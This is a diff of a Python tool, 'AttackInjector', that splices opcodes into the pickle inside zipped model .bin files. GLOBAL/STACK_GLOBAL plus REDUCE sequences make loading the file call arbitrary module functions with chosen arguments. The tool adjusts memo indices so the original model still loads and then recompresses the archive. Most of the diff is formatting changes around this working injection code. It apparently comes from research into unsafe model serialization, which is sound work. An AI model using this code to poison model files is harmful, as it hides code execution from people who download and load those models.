@@ -23,6 +23,7 @@ GLOBAL_END = b"\x0A"
 BYTE_MAX = 0xFF
 ZIP_PICKLE = "archive/data.pkl"
 
+
 class AttackInjector():
     def __init__(self, bin_io):
         self.bin_io = bin_io
@@ -43,7 +44,7 @@ class AttackInjector():
         out_pickle.write(opcode_library[GLOBAL].code.encode('raw_unicode_escape'))
         out_pickle.write(module_str.encode('raw_unicode_escape'))
         out_pickle.write(GLOBAL_END)
-        
+
         return 0
 
     @staticmethod
@@ -61,7 +62,7 @@ class AttackInjector():
         """
         memo_opcode = BINGET if last_memo_index <= BYTE_MAX else LONG_BINGET
         byte_length = 1 if last_memo_index <= BYTE_MAX else 4
-        
+
         out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
         out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))
 
@@ -81,12 +82,12 @@ class AttackInjector():
         """
         memo_opcode = BINPUT if last_memo_index <= BYTE_MAX else LONG_BINPUT
         byte_length = 1 if last_memo_index <= BYTE_MAX else 4
-        
+
         out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
         out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))
 
         return 1
-    
+
     @staticmethod
     def write_binunicode(last_memo_index, out_pickle, unicode_str):
         """
@@ -146,81 +147,81 @@ class AttackInjector():
 
     @staticmethod
     def memo_inject_attack(last_memo_index, out_pickle, module_str):
-        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL     <module_str>
-        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP
+        AttackInjector.write_global(None, out_pickle, module_str)  # GLOBAL     <module_str>
+        AttackInjector.write_put(last_memo_index + 1, out_pickle)  # BINPUT/LONG_BINPUT     N + 1
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 1
-    
+
     @staticmethod
     def sequential_module_attack_with_memo(last_memo_index, out_pickle, module_str, arg_str):
-        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL                 <module_str>
-        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE             <arg_str>
-        AttackInjector.write_put(last_memo_index + 2, out_pickle)    # BINPUT/LONG_BINPUT     N + 2
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
-        AttackInjector.write_put(last_memo_index + 3, out_pickle)    # BINPUT/LONG_BINPUT     N + 3
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
-        AttackInjector.write_put(last_memo_index + 4, out_pickle)    # BINPUT/LONG_BINPUT     N + 4
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP
+        AttackInjector.write_global(None, out_pickle, module_str)  # GLOBAL                 <module_str>
+        AttackInjector.write_put(last_memo_index + 1, out_pickle)  # BINPUT/LONG_BINPUT     N + 1
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)  # BINUNICODE             <arg_str>
+        AttackInjector.write_put(last_memo_index + 2, out_pickle)  # BINPUT/LONG_BINPUT     N + 2
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)  # TUPLE1
+        AttackInjector.write_put(last_memo_index + 3, out_pickle)  # BINPUT/LONG_BINPUT     N + 3
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)  # REDUCE
+        AttackInjector.write_put(last_memo_index + 4, out_pickle)  # BINPUT/LONG_BINPUT     N + 4
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 4
 
     @staticmethod
     def sequential_module_attack_without_memo(last_memo_index, out_pickle, module_str, arg_str):
-        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL         <module_str>
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE     <arg_str>
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP
+        AttackInjector.write_global(None, out_pickle, module_str)  # GLOBAL         <module_str>
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)  # BINUNICODE     <arg_str>
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)  # TUPLE1
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)  # REDUCE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 0
-    
+
     @staticmethod
     def module_attack_using_memo(last_memo_index, out_pickle, memo_ind, arg_str):
-        AttackInjector.write_get(memo_ind, out_pickle)                         # BINGET/LONG_BINGET     N + 2
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)             # BINUNICODE             <arg_str>
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)           # TUPLE1
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)           # REDUCE
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)              # POP
+        AttackInjector.write_get(memo_ind, out_pickle)  # BINGET/LONG_BINGET     N + 2
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)  # BINUNICODE             <arg_str>
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)  # TUPLE1
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)  # REDUCE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 0
 
     @staticmethod
     def memo_inject_attack_proto_4(last_memo_index, out_pickle, module_name, qualname):
-        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
-        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP
+        AttackInjector.write_binunicode(None, out_pickle, module_name)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_binunicode(None, out_pickle, qualname)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)  # STACK_GLOBAL
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)  # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 1
-    
+
     @staticmethod
     def sequential_module_attack_with_memo_proto_4(last_memo_index, out_pickle, module_name, qualname, arg_str):
-        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
-        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)                # BINUNICODE             <arg_str>
-        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)              # TUPLE1
-        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)              # REDUCE
-        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)             # MEMOIZE
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP
+        AttackInjector.write_binunicode(None, out_pickle, module_name)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_binunicode(None, out_pickle, qualname)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)  # STACK_GLOBAL
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)  # MEMOIZE
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)  # BINUNICODE             <arg_str>
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)  # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)  # TUPLE1
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)  # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)  # REDUCE
+        AttackInjector.write_simple_opcode(None, out_pickle, MEMOIZE)  # MEMOIZE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 4
 
     @staticmethod
     def sequential_module_attack_without_memo_proto_4(last_memo_index, out_pickle, module_name, qualname, arg_str):
-        AttackInjector.write_binunicode(None, out_pickle, module_name)            # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_binunicode(None, out_pickle, qualname)               # SHORT_BINUNICODE       <module_name>
-        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)        # STACK_GLOBAL
-        AttackInjector.write_binunicode(None, out_pickle, arg_str)                # BINUNICODE     <arg_str>
-        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)              # TUPLE1
-        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)              # REDUCE
-        AttackInjector.write_simple_opcode(None, out_pickle, POP)                 # POP
+        AttackInjector.write_binunicode(None, out_pickle, module_name)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_binunicode(None, out_pickle, qualname)  # SHORT_BINUNICODE       <module_name>
+        AttackInjector.write_simple_opcode(None, out_pickle, STACK_GLOBAL)  # STACK_GLOBAL
+        AttackInjector.write_binunicode(None, out_pickle, arg_str)  # BINUNICODE     <arg_str>
+        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)  # TUPLE1
+        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)  # REDUCE
+        AttackInjector.write_simple_opcode(None, out_pickle, POP)  # POP
 
         return 0
 
@@ -287,10 +288,11 @@ class AttackInjector():
             if (opcode_is_memo or opcode_is_get) and args[i] > last_memo_index:
                 incremented_memo_record = True
                 args[i] += memo_offset
-        
+
         return incremented_memo_record
-    
-    def _reconstruct_pickle(self, attack_index, end_index, uses_memo, last_memo_index, in_pickle, out_pickle, opcodes, args, pos):
+
+    def _reconstruct_pickle(self, attack_index, end_index, uses_memo, last_memo_index, in_pickle, out_pickle, opcodes,
+                            args, pos):
         """
         Reconstructs the end of a pickle file which has been modified.
         """
@@ -322,10 +324,10 @@ class AttackInjector():
             in_pickle.seek(attack_pos)
             out_pickle.write(in_pickle.read())
 
-
     def _inject_attacks(self, attacks, attack_indices, attack_args, in_pickle, out_pickle):
         """
         Injects a list of attacks into pickle file
+        :param in_pickle: file object read as bytes.
         """
         # First, extract every command from the pickle file
         opcodes, args, pos = self._get_all_commands(in_pickle)
@@ -437,12 +439,12 @@ class AttackInjector():
         in_pickle.close()
         out_pickle_write.close()
         out_pickle_read = open(out_pickle_temp.name, "rb")
-        self.bin_io.inject_pickle_and_compress(
-            bin_dirname,
-            file_type,
-            out_pickle_read,
-            out_bin_dir
+        out_bytearray = self.bin_io.read_pickle_from_file_obj_to_bytearray(out_pickle_read)
+        self.bin_io.write_pickle_from_bytearray(out_bytearray, f"{bin_dirname}/{ZIP_PICKLE}")
+        self.bin_io.compress(
+            bin_dirname,  # the directory in which the bin file exists.
+            out_bin_dir  # the path of the output bin file.
         )
-        shutil.rmtree(f"{bin_dirname}/archive") # Remove working dir
+        # shutil.rmtree(f"{bin_dirname}/archive")  # Remove working dir
 
         return memo_mod_start
